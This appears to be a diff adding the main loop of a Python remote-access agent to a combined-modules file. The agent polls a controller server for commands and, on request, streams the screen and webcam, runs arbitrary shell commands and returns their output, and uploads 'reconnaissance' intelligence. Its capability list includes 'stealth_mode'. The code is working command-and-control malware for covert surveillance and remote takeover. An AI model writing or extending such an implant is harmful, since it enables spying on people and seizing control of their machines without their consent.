+        capabilities = ["basic_commands", "system_info"]
+        capabilities.extend(["enhanced_screen_stream", "enhanced_camera_stream"])
+        capabilities.extend(["security_features", "reconnaissance", "stealth_mode"])
+        return capabilities
+    
+    def _enhanced_main_loop(self):
+        """Main agent loop"""
+        last_checkin = 0
+        checkin_interval = 30  # Check in every 30 seconds
+        
+        while self.running:
+            try:
+                current_time = time.time()
+                
+                # Periodic check-in
+                if current_time - last_checkin > checkin_interval:
+                    self._checkin_with_controller()
+                    last_checkin = current_time
+                
+                # Process commands
+                self._process_enhanced_commands()
+                
+                # Small sleep to prevent busy waiting
+                time.sleep(1)
+                
+            except KeyboardInterrupt:
+                print("Received interrupt signal")
+                break
+            except Exception as e:
+                print(f"Error in main loop: {e}")
+                time.sleep(5)  # Wait before retrying
+    
+    def _checkin_with_controller(self):
+        """Check in with controller"""
+        try:
+            checkin_data = {
+                "agent_id": self.agent_id,
+                "status": "active",
+                "timestamp": time.time(),
+                "streaming_status": self._get_enhanced_streaming_status()
+            }
+            
+            response = requests.post(
+                f"{self.server_url}/checkin",
+                json=checkin_data,
+                timeout=5
+            )
+            
+            if response.status_code != 200:
+                print(f"Check-in failed: {response.status_code}")
+                
+        except Exception as e:
+            pass  # Debug level since this is expected to fail sometimes
+    
+    def _process_enhanced_commands(self):
+        """Process pending commands from controller"""
+        try:
+            response = requests.get(
+                f"{self.server_url}/commands/{self.agent_id}",
+                timeout=5
+            )
+            
+            if response.status_code == 200:
+                commands = response.json().get("commands", [])
+                for command in commands:
+                    self._execute_enhanced_command(command)
+                    
+        except Exception as e:
+            pass
+    
+    def _execute_enhanced_command(self, command: Dict[str, Any]):
+        """Execute a command"""
+        try:
+            cmd_type = command.get("type")
+            cmd_data = command.get("data", {})
+            
+            print(f"Executing command: {cmd_type}")
+            
+            if cmd_type == "start-stream":
+                self.start_enhanced_screen_stream()
+            elif cmd_type == "stop-stream":
+                self.stop_enhanced_screen_stream()
+            elif cmd_type == "start-camera":
+                self.start_enhanced_camera_stream()
+            elif cmd_type == "stop-camera":
+                self.stop_enhanced_camera_stream()
+            elif cmd_type == "system-info":
+                self._send_enhanced_system_info()
+            elif cmd_type == "execute":
+                self._execute_enhanced_system_command(cmd_data.get("command", ""))
+            elif cmd_type == "reconnaissance":
+                self._perform_enhanced_reconnaissance()
+            else:
+                print(f"Unknown command type: {cmd_type}")
+                
+        except Exception as e:
+            print(f"Command execution error: {e}")
+    
+    def start_enhanced_screen_stream(self, fps: int = 30):
+        """Start screen streaming"""
+        if self.stream_manager:
+            success = self.stream_manager.start_screen_stream(fps)
+            if success:
+                print("Enhanced screen streaming started")
+                return True
+        return False
+    
+    def stop_enhanced_screen_stream(self):
+        """Stop screen streaming"""
+        if self.stream_manager:
+            success = self.stream_manager.stop_screen_stream()
+            if success:
+                print("Enhanced screen streaming stopped")
+                return True
+        return False
+    
+    def start_enhanced_camera_stream(self, fps: int = 30):
+        """Start camera streaming"""
+        if self.stream_manager:
+            success = self.stream_manager.start_camera_stream(fps)
+            if success:
+                print("Enhanced camera streaming started")
+                return True
+        return False
+    
+    def stop_enhanced_camera_stream(self):
+        """Stop camera streaming"""
+        if self.stream_manager:
+            success = self.stream_manager.stop_camera_stream()
+            if success:
+                print("Enhanced camera streaming stopped")
+                return True
+        return False
+    
+    def stop_all_enhanced_streams(self):
+        """Stop all active streams"""
+        self.stop_enhanced_screen_stream()
+        self.stop_enhanced_camera_stream()
+        print("All streams stopped")
+    
+    def _get_enhanced_streaming_status(self) -> Dict[str, Any]:
+        """Get current streaming status"""
+        if self.stream_manager:
+            return self.stream_manager.get_status()
+        
+        # Legacy status
+        return {
+            "screen_streaming": self.streaming_enabled,
+            "camera_streaming": self.camera_streaming_enabled,
+            "screen_stats": None,
+            "camera_stats": None
+        }
+    
+    def _send_enhanced_system_info(self):
+        """Send system information to controller"""
+        try:
+            if self.security:
+                # Use enhanced reconnaissance
+                info = self.security.gather_intelligence()
+            else:
+                # Basic system info
+                info = {
+                    "hostname": socket.gethostname(),
+                    "platform": platform.system(),
+                    "architecture": platform.architecture(),
+                    "processor": platform.processor(),
+                    "timestamp": time.time()
+                }
+            
+            response = requests.post(
+                f"{self.server_url}/system-info/{self.agent_id}",
+                json=info,
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                print("System info sent successfully")
+            else:
+                print(f"Failed to send system info: {response.status_code}")
+                
+        except Exception as e:
+            print(f"Error sending system info: {e}")
+    
+    def _execute_enhanced_system_command(self, command: str):
+        """Execute a system command"""
+        try:
+            if not command.strip():
+                return
+            
+            print(f"Executing system command: {command}")
+            
+            result = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+            
+            output = {
+                "command": command,
+                "returncode": result.returncode,
+                "stdout": result.stdout,
+                "stderr": result.stderr,
+                "timestamp": time.time()
+            }
+            
+            # Send result back to controller
+            response = requests.post(
+                f"{self.server_url}/command-result/{self.agent_id}",
+                json=output,
+                timeout=10
+            )
+            
+            if response.status_code == 200:
+                print("Command result sent successfully")
+            else:
+                print(f"Failed to send command result: {response.status_code}")
+                
+        except subprocess.TimeoutExpired:
+            print("Command execution timed out")
+        except Exception as e:
+            print(f"Error executing command: {e}")
+    
+    def _perform_enhanced_reconnaissance(self):
+        """Perform system reconnaissance"""
+        if not self.security:
+            print("Security features not available for reconnaissance")
+            return
+        
+        try:
+            print("Performing reconnaissance...")
+            intel = self.security.gather_intelligence()
+            
+            # Send encrypted intelligence to controller
+            response = requests.post(
+                f"{self.server_url}/intelligence/{self.agent_id}",
+                json=intel,
+                timeout=30
+            )
+            
+            if response.status_code == 200:
+                print("Intelligence sent successfully")
+            else:
+                print(f"Failed to send intelligence: {response.status_code}")
+                
+        except Exception as e:
+            print(f"Reconnaissance error: {e}")
+
+# ========================================================================================
 # END OF COMBINED MODULES
 # ========================================================================================
